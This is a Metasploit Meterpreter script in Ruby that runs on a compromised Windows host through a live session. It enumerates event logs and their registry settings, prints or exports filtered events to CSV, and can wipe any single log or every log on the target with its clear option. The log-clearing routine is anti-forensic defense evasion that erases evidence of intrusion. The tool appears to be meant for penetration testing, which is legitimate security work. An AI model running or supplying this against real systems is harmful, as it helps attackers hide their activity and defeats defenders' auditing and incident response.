# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################
@client = client
eventlog_name = nil
print_logs = false
list_logs = false
clear_logs = false
local_log = false
local_log_path = nil
supress_print = false
filter = '\d*'
filter_string = "*"
meter_type = client.platform
opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu" ],
	"-i" => [ false, "Show information about Event Logs on the System and their configuration"],
	"-l" => [ true,  "List a given Event Log."],
	"-c" => [ true,  "Clear a given Event Log (or ALL if no argument specified)"],
	"-f" => [ true,  "Event ID to filter events on"],
	"-s" => [ true,  "Save logs to local CSV file, optionally specify alternate folder in which to save logs"],
	"-p" => [ false, "Supress printing filtered logs to screen"]
)


################## Function Declarations ##################

# Usage Message Function
#-------------------------------------------------------------------------------
def usage(opts)
	print_line "Meterpreter Script for Windows Event Log Query and Clear."
	print_line(opts.usage)
	raise Rex::Script::Completed
end

# Wrong Meterpreter Version Message Function
#-------------------------------------------------------------------------------
def wrong_meter_version(meter = meter_type)
	print_error("#{meter} version of Meterpreter is not supported with this script!")
	raise Rex::Script::Completed
end

# Function for Enumerating EventLogs
#-------------------------------------------------------------------------------
def get_log_details
	logs_detail = Array.new

	eventlog_list.each do |log_name|

		# Create a hash to store the log info in (and throw default info in)
		log_detail = Hash.new
		log_detail[:name] = log_name
		log_detail[:retention] = "Disabled"
		log_detail[:size] = 0
		log_detail[:number_of_records] = 0

		key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\"
		if @client.sys.config.sysinfo['OS'] =~ /Windows 2003|.Net|XP|2000/
			key = "#{key}Eventlog"
		else
			key = "#{key}eventlog"
		end

		begin
			unless (registry_getvaldata("#{key}\\#{log_name}","Retention") == 0) then log_detail[:retention] = "Disabled" end
			log_detail[:size] = registry_getvaldata("#{key}\\#{log_name}","MaxSize")

			# Open the event log
			eventlog = @client.sys.eventlog.open(log_name)
			log_detail[:num_of_records] = eventlog.length
		rescue
			log_detail[:num_of_records] = "Access Denied"
		end


		logs_detail << log_detail
	end

	return logs_detail
end


# Function for Printing Event Log Details
#-------------------------------------------------------------------------------
def print_log_details
	print_status("Retriving Event Log Configuration")
	tbl = Rex::Ui::Text::Table.new(
		'Header'  => "Event Logs on System",
		'Indent'  => 1,
		'Columns' => [
			"Name",
			"Retention",
			"Maximum Size",
			"Records"
		])

	eventlog_details = get_log_details

	eventlog_details.each do |log_detail|
		tbl << [log_detail[:name],log_detail[:retention],"#{log_detail[:size]}K",log_detail[:num_of_records]]
	end

	print_line("\n" + tbl.to_s + "\n")
end


# Function for doings queries of EventLogs
#-------------------------------------------------------------------------------
def list_logs(eventlog_name,filter,filter_string,logs,local_log,sup_print)
	begin
		event_data = ""
		csv_data = "EventID,Date,Data\n"
		log = @client.sys.eventlog.open(eventlog_name)
		log.each_backwards do |e|
			if e.eventid.to_s =~ /#{filter}/
				if not sup_print
					print_status("EventID: #{e.eventid}")
					print_status("Date: #{e.generated}")
					print_status("Data:")
					e.strings.each do |l|
						l.split("\r\n").each do |ml|
							print_status("\t#{ml.chomp}")
							event_data << " #{ml.chomp}"
						end
					end
					print_status
				end
			csv_data << "#{e.eventid},#{e.generated},\"#{event_data}\"\n"
			event_data = ""
			end
		end
	rescue
		print_error("Failed to Open Event Log #{eventlog_name}")
		raise Rex::Script::Completed
	end

	if local_log
		log_file = File.join(logs, "#{eventlog_name}.csv")
		print_good("CSV File saved to #{log_file}")
		file_local_write(log_file,csv_data)
	end
end

# Function for clearing EventLogs
#-------------------------------------------------------------------------------
def clear_logs(log_name=nil)
	log_names = []
	if log_name.nil?
		log_names = eventlog_list
	else
		log_names << log_name
	end

	log_names.each do |name|
		begin
			print_status("Clearing #{name}")
			event_log = @client.sys.eventlog.open(name)
			event_log.clear
			print_status("Event Log #{name} Cleared!")
		rescue
			print_error("Failed to Clear #{name}, Access Denied")
		end
	end

	return log_names
end

################## Main ##################
opts.parse(args) { |opt, idx, val|
	case opt
		when "-h"
			usage(opts)
		when "-i"
			print_logs = true
			print_log_details
			raise Rex::Script::Completed
		when "-c"
			clear_logs = true
			eventlog_name = val
		when "-l"
			list_logs = true
			eventlog_name = val
		when "-f"
			filter = val
		when "-s"
			local_log = true
			if File.directory?(val)
				local_log_path = val
			else
				print_error("Log folder #{val} does not exist!")
				raise Rex::Script::Completed
			end
		when "-p"
			supress_print = true
	end
}

# Check for Version of Meterpreter
wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i

# Print usage & exit if the user didn't specify an action
#  to default to just running for all logs)
if !list_logs and !clear_logs and !print_logs
	usage(opts)
end

# Log Folder Creation
#-----------------------------------------------------------------------
#Get Hostname
host = @client.sys.config.sysinfo["Computer"]

# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

# Create a directory for any local logging if the user desires
if local_log
	if local_log_path
		logs = ::File.join(local_log_path, Rex::FileUtils.clean_path(host + filenameinfo) )
	else
		logs = ::File.join(Msf::Config.log_directory, "scripts", 'event_manager', Rex::FileUtils.clean_path(host + filenameinfo) )
	end

	::FileUtils.mkdir_p(logs)
end

# List the logs if the user desires
if list_logs and eventlog_name
	list_logs(eventlog_name,filter,filter_string,logs,local_log,supress_print)
else
	print_error("You must specify and eventlog to query!")
end


# Finally, clear the specified logs if the user desires
if clear_logs
	if eventlog_name
		clear_logs(eventlog_name)
	else
		eventlog_list.each do |eventlog_name|
			print_status eventlog_name + ": "
			clear_logs(eventlog_name)
		end
	end
end
